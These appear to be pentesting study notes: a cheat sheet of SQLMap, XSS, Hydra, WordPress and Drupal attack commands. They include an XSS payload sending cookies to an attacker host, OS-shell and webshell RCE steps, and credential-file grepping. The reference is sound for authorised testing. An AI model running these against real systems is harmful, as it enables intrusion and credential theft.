# Web Application Attacks

> Status: ✅ Reference complete
> Date started: 2026-10-27
> Date finished: 2026-10-27

## 1. Goal
Exploit common web vulns — SQL injection (SQLMap), XSS, HTTP auth brute force, and CMS attacks (WordPress, Drupal). Placeholders: `<TARGET_IP>`, `<IP>`, `<USERS_LIST>`, `<PW_LIST>`.

## SQL injection — SQLMap
```bash
# detect
sqlmap -r <REQUEST_FILE> -p <POST_PARAM>              # saved Burp request
sqlmap -u "http://<TARGET_IP>/file.php?id=1" -p id    # GET
sqlmap -u "http://<TARGET_IP>/login.php" --data="user=admin&password=admin"   # POST
sqlmap -u "http://<TARGET_IP>/sqli.php?title=x&action=search" --cookie "PHPSESSID=...; security_level=0" -p title
# enumerate
sqlmap ... --dbs                                      # databases
sqlmap ... -D <db> --tables                           # tables (--common-tables to guess)
sqlmap ... -D <db> -T <table> --columns
sqlmap ... -D <db> -T <table> -C col1,col2 --dump
# RCE
sqlmap -u "http://<TARGET_IP>/file.php?id=1" --os-shell
```

## Cross-Site Scripting (XSS)
```html
<script>alert("hack :)")</script>                     <!-- reflected/stored PoC -->
<!-- cookie hijack: exfil to attacker logging server -->
<script>var i=new Image();i.src="http://<IP>/log.php?q="+document.cookie;</script>
<!-- attacker side: nc -vv -k -l -p 80  (catch the cookie, then reuse it) -->
```
```bash
# XSSer (automated)
xsser --url 'http://<TARGET_IP>/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS'
xsser --url '...' -p '...' --auto
xsser --url '...' -p '...' --Fp "<script>alert(1)</script>"
# authenticated
xsser --url "http://<TARGET_IP>/htmli_get.php?firstname=XSS&lastname=hi&form=submit" --cookie="PHPSESSID=...; security_level=0" --Fp "<script>alert(1)</script>"
```

## HTTP auth brute force (Hydra)
```bash
hydra -L <USERS_LIST> -P <PW_LIST> <TARGET_IP> http-post-form "/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid credentials or user not activated!"
```

## WordPress
```text
# key paths / files
/wp-login.php  /wp-admin/  xmlrpc.php  /wp-content/uploads/  /wp-content/themes/<theme>/404.php
wp-config.php  → DB creds (root password of the database)
license.txt / readme.html → version
# passive version/plugins/themes
curl https://victim.com/ | grep 'content="WordPress'
curl -s https://victim.com/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,X,g' | awk -F "X" '{print $2}' | cut -d "'" -f2
# user enumeration
curl -s -I -X GET http://blog.example.com/?author=1          # 200/30X = valid id
curl http://blog.example.com/wp-json/wp/v2/users
```
```bash
# WPScan
wpscan --url "http://<TARGET_IP>" -e t      # themes   (-e vt vuln themes)
wpscan --url "http://<TARGET_IP>" -e p      # plugins  (-e vp vuln plugins)
wpscan --url "http://<TARGET_IP>" -e u      # users
wpscan --url "http://<TARGET_IP>" --passwords /usr/share/wordlists/rockyou.txt
# RCE — upload reverse shell to a theme (e.g. twentyfifteen/404.php), or:
use exploit/unix/webapp/wp_admin_shell_upload   # set USERNAME/PASSWORD/targeturi /wordpress
```

## Drupal
```bash
# discovery / version
curl https://site/ | grep 'content="Drupal'
curl -s http://site/CHANGELOG.txt | grep -m2 ""       # version (newer installs block it)
curl http://site/node/1                                # content nodes
droopescan scan drupal -u http://drupal-site.local     # automated
# user enum: /user/register (name taken?) ; /user/<number> ; password-reset message diff
# installed modules
curl https://site/config/sync/core.extension.yml ; curl https://site/core/core.services.yml
```
```text
# RCE — PHP Filter module (Drupal ≤7): enable PHP Filter → Add content → PHP code in body → visit node
# Drupal 8+: install PHP Filter module (php-8.x-1.1.tar.gz) first, then same
# Backdoored module: add shell.php + .htaccess (RewriteEngine On) into a module tar (e.g. captcha) → install → /modules/captcha/shell.php?cmd=
# Drupalgeddon2 (CVE-2018-7600): Drupal <7.58 / <8.3.9 / <8.4.6 / <8.5.1 → unauth RCE (public PoCs)
```
```bash
# post-exploitation
find / -name settings.php -exec grep "'database'\|'username'\|'password'\|'host'" {} \; 2>/dev/null
mysql -u drupaluser --password='<PW>' -e 'use drupal; select * from users'
```

> Flow: map the app (module 11) → test each input (SQLi with SQLMap, XSS reflected/stored) → for a CMS, fingerprint version → WPScan/droopescan for vuln plugins/themes → authenticated RCE via theme/module upload or a version CVE. Brute force and exploitation = scope + approval only.

---
### References (source credits)
- blog.syselement.com/ine/courses/ejpt
- book.hacktricks.xyz/network-services-pentesting/pentesting-web/
- academy.hackthebox.com
